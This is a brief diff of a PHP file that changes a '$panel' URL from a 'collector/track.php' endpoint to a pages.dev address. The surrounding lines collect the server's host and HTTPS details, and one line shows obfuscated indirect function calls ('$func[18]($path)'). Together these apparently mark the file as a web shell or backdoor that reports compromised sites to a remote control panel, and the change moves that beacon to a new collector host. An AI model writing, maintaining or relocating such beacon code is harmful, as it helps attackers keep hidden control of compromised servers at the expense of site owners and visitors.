@@ -1,5 +1,5 @@
 <?php
-$panel = 'https://panel.trixygame.com/admin/collector/track.php';
+$panel = 'https://collecptrxygms.pages.dev/';
 
 $host   = $_SERVER['HTTP_HOST'] ?? '';
 $https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
@@ -543,3 +543,4 @@ $dirs = $func[18]($path);
 </body>
 
 </html>
+
